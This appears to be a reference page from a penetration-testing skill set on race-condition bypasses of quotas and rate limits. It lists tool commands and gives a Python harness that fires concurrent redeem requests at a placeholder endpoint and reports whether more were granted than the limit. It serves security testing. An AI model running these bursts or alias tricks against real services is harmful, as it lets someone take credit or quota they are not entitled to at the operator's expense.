# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`business-logic-flaws-quota-and-rate`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Turbo Intruder` | `engine.queue with gate/race-sync to release the burst in one packet group` | Land many identical requests inside the validation window to expose a non-atomic counter | Cross-platform |
| `curl` | `curl -sS -D - -o /dev/null 'https://target.example/api/quota' (read X-RateLimit-Remaining)` | Establish the serial ceiling and read the remaining-count header before bursting | Cross-platform |
| `Burp Suite Intruder` | `Pitchfork over a list of normalised-equivalent email aliases` | Test whether the counter key restarts across alias forms of one mailbox | Cross-platform |
| `jq` | `jq ".remaining, .granted" <(curl -sS https://target.example/api/quota)` | Read the authoritative granted and remaining fields instead of trusting a status code | Cross-platform |

## Minimal Script Shape

A burst harness: it releases a thread pool of identical requests against a known ceiling and reports how many the server granted, flagging a quota bypass when the grant exceeds the ceiling.

```python
import concurrent.futures
import urllib.error
import urllib.request

URL = 'https://target.example/api/redeem'
HEADERS = {'Cookie': 'session=<disposable-account>'}
CEILING = 10

def attempt(_):
    req = urllib.request.Request(URL, data=b'', method='POST', headers=HEADERS)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
    results = list(pool.map(attempt, range(20)))
granted = results.count(200)
print({'ceiling': CEILING, 'granted_in_burst': granted,
       'quota_bypass': granted > CEILING})
```
